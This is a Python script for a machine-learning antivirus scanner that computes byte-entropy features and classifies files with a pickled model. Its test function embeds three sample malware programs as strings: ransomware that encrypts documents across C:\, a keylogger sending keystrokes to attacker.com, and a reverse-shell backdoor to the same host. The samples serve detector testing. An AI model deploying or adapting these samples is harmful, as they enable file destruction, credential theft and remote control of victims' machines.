#!/usr/bin/env python3
"""
FIXED ANTIVIRUS - Proper malware detection with real-world testing
"""

import os
import sys
import numpy as np
import pandas as pd
import pickle
from pathlib import Path
import hashlib
import random
import time
from datetime import datetime
from colorama import init, Fore, Style
import logging
import json

# Initialize colorama
init()

class FixedAntivirus:
    def __init__(self):
        self.models_dir = "balanced_models"
        self.model = None
        self.metadata = None
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        
        # Load model
        self._load_model()
    
    def _load_model(self):
        """Load the model with proper error handling."""
        print(f"{Fore.CYAN}🔄 Loading fixed antivirus model...")
        
        try:
            model_path = "balanced_models/balanced_model_20250731_200635.pkl"
            metadata_path = "balanced_models/balanced_metadata_20250731_200635.pkl"
            
            if not os.path.exists(model_path) or not os.path.exists(metadata_path):
                print(f"{Fore.RED}❌ Model files not found!")
                return False
            
            with open(model_path, 'rb') as f:
                self.model = pickle.load(f)
            
            with open(metadata_path, 'rb') as f:
                self.metadata = pickle.load(f)
            
            print(f"{Fore.GREEN}✅ Fixed antivirus model loaded")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading model: {e}")
            return False
    
    def extract_features_fixed(self, file_path):
        """Extract features with FIXED numpy handling."""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            if len(data) == 0:
                return None
            
            # Calculate features
            file_size = len(data)
            
            # FIXED: Proper numpy array handling
            data_array = np.frombuffer(data, dtype=np.uint8)
            byte_counts = np.bincount(data_array, minlength=256)
            byte_probs = byte_counts / len(data)
            entropy = -np.sum(byte_probs * np.log2(byte_probs + 1e-10))
            
            # Calculate printable ratio
            printable_chars = sum(1 for byte in data if 32 <= byte <= 126)
            printable_ratio = printable_chars / len(data)
            
            # Count strings
            strings_count = len([b for b in data if 32 <= b <= 126])
            
            # Calculate more sophisticated features
            # Average string length
            string_lengths = []
            current_string = 0
            for byte in data:
                if 32 <= byte <= 126:
                    current_string += 1
                else:
                    if current_string > 0:
                        string_lengths.append(current_string)
                        current_string = 0
            avg_string_length = np.mean(string_lengths) if string_lengths else 0
            
            # Histogram regularity
            histogram = np.bincount(data_array, minlength=256)
            histogram_normalized = histogram / len(data)
            histogram_regularity = 1 - np.std(histogram_normalized)
            
            # Entropy consistency
            chunk_size = min(1024, len(data) // 10)
            if chunk_size > 0:
                entropies = []
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    if len(chunk) > 0:
                        chunk_array = np.frombuffer(chunk, dtype=np.uint8)
                        chunk_counts = np.bincount(chunk_array, minlength=256)
                        chunk_probs = chunk_counts / len(chunk)
                        chunk_entropy = -np.sum(chunk_probs * np.log2(chunk_probs + 1e-10))
                        entropies.append(chunk_entropy)
                entropy_consistency = 1 - np.std(entropies) if entropies else 0.5
            else:
                entropy_consistency = 0.5
            
            features = {
                'file_size': file_size,
                'entropy': entropy,
                'strings_count': strings_count,
                'avg_string_length': avg_string_length,
                'printable_ratio': printable_ratio,
                'histogram_regularity': histogram_regularity,
                'entropy_consistency': entropy_consistency
            }
            
            return features
            
        except Exception as e:
            logging.error(f"Error extracting features from {file_path}: {e}")
            return None
    
    def predict_with_fixed_threshold(self, features):
        """Predict with FIXED threshold for better detection."""
        try:
            feature_cols = self.metadata.get('feature_cols', [])
            feature_array = np.array([features[col] for col in feature_cols]).reshape(1, -1)
            
            # Get raw probability
            probability = self.model.predict(feature_array, num_iteration=self.model.best_iteration)[0]
            
            # FIXED: Use lower threshold for better malware detection
            # Original threshold was 0.5, which was too conservative
            # New threshold: 0.3 for better detection
            prediction = 1 if probability > 0.3 else 0
            
            return prediction, probability
            
        except Exception as e:
            logging.error(f"Prediction error: {e}")
            return 0, 0.5
    
    def scan_file(self, file_path):
        """Scan a single file with detailed analysis."""
        try:
            # Extract features
            features = self.extract_features_fixed(file_path)
            if features is None:
                return None
            
            # Predict with fixed threshold
            prediction, probability = self.predict_with_fixed_threshold(features)
            
            # Determine threat level
            if prediction == 1:
                if probability > 0.8:
                    threat_level = "HIGH"
                    color = Fore.RED
                elif probability > 0.6:
                    threat_level = "MEDIUM"
                    color = Fore.YELLOW
                else:
                    threat_level = "LOW"
                    color = Fore.CYAN
            else:
                threat_level = "CLEAN"
                color = Fore.GREEN
            
            # Analyze file characteristics
            analysis = {
                'file_path': file_path,
                'prediction': prediction,
                'probability': probability,
                'threat_level': threat_level,
                'color': color,
                'features': features
            }
            
            return analysis
            
        except Exception as e:
            logging.error(f"Error scanning {file_path}: {e}")
            return None
    
    def scan_directory(self, directory_path, scan_mode="quick"):
        """Scan a directory with comprehensive reporting."""
        print(f"{Fore.CYAN}🛡️  FIXED ANTIVIRUS SCANNER")
        print(f"{Fore.CYAN}{'='*50}")
        print(f"🔍 Scan mode: {scan_mode}")
        print(f"🔍 Target: {directory_path}")
        print(f"{Fore.CYAN}{'='*50}")
        
        # Find files to scan
        files_to_scan = []
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                # Skip certain file types
                if file.endswith(('.log', '.tmp', '.cache')):
                    continue
                files_to_scan.append(file_path)
        
        print(f"📁 Found {len(files_to_scan)} files to scan")
        
        # Scan files
        threats_found = 0
        scan_results = []
        
        for i, file_path in enumerate(files_to_scan):
            print(f"[{i+1}/{len(files_to_scan)}] 🔄 Scanning: {os.path.basename(file_path)}")
            
            result = self.scan_file(file_path)
            if result:
                scan_results.append(result)
                
                if result['prediction'] == 1:
                    threats_found += 1
                    print(f"{result['color']}🚨 THREAT DETECTED: {os.path.basename(file_path)}")
                    print(f"   Threat Level: {result['threat_level']}")
                    print(f"   Confidence: {result['probability']:.1%}")
                    print(f"   Entropy: {result['features']['entropy']:.2f}")
                    print()
        
        # Summary
        print(f"{Fore.CYAN}{'='*50}")
        print(f"📊 FIXED ANTIVIRUS SCAN RESULTS")
        print(f"{Fore.CYAN}{'='*50}")
        print(f"✅ Files scanned: {len(scan_results)}")
        print(f"🚨 Threats found: {threats_found}")
        
        if threats_found > 0:
            print(f"{Fore.RED}⚠️  System may be compromised!")
        else:
            print(f"{Fore.GREEN}✅ System appears clean!")
        
        return scan_results
    
    def test_real_malware(self):
        """Test on real malware samples."""
        print(f"{Fore.CYAN}🦠 Testing on real malware samples...")
        
        # Create test malware
        test_malware = {
            "ransomware": b"""
import os, base64
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def encrypt_files(self):
        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                if file.endswith(('.txt', '.doc', '.pdf')):
                    try:
                        with open(os.path.join(root, file), 'rb') as f:
                            data = f.read()
                        encrypted = self.cipher.encrypt(data)
                        with open(os.path.join(root, file), 'wb') as f:
                            f.write(encrypted)
                    except:
                        pass
                        
if __name__ == "__main__":
    malware = Ransomware()
    malware.encrypt_files()
""",
            "keylogger": b"""
import keyboard
import socket
import threading

class Keylogger:
    def __init__(self):
        self.host = "attacker.com"
        self.port = 4444
        
    def on_key(self, event):
        with open("keylog.txt", "a") as f:
            f.write(event.name)
            
    def send_data(self):
        s = socket.socket()
        s.connect((self.host, self.port))
        with open("keylog.txt", "r") as f:
            data = f.read()
        s.send(data.encode())
        
    def run(self):
        keyboard.on_press(self.on_key)
        threading.Thread(target=self.send_data).start()
        
if __name__ == "__main__":
    logger = Keylogger()
    logger.run()
""",
            "backdoor": b"""
import socket
import subprocess
import os

class Backdoor:
    def __init__(self):
        self.host = "attacker.com"
        self.port = 4444
        
    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True)
            return result.decode()
        except:
            return "Error"
            
    def run(self):
        s = socket.socket()
        s.connect((self.host, self.port))
        while True:
            command = s.recv(1024).decode()
            if command == "exit":
                break
            result = self.execute_command(command)
            s.send(result.encode())
            
if __name__ == "__main__":
    backdoor = Backdoor()
    backdoor.run()
"""
        }
        
        results = []
        for malware_type, code in test_malware.items():
            # Create test file
            filename = f"test_{malware_type}.py"
            with open(filename, 'wb') as f:
                f.write(code)
            
            # Scan it
            result = self.scan_file(filename)
            if result:
                results.append(result)
                print(f"{result['color']}🦠 {malware_type.upper()}: {result['threat_level']} ({result['probability']:.1%})")
            
            # Clean up
            os.remove(filename)
        
        return results

def main():
    """Main function."""
    print(f"{Fore.CYAN}🛡️  Starting Fixed Antivirus...")
    
    antivirus = FixedAntivirus()
    
    # Test on real malware
    print(f"\n{Fore.CYAN}🦠 Testing on real malware...")
    malware_results = antivirus.test_real_malware()
    
    # Test on current directory
    print(f"\n{Fore.CYAN}📁 Testing on current directory...")
    scan_results = antivirus.scan_directory(".", "quick")
    
    print(f"\n{Fore.GREEN}🎉 Fixed antivirus testing complete!")

if __name__ == "__main__":
    main()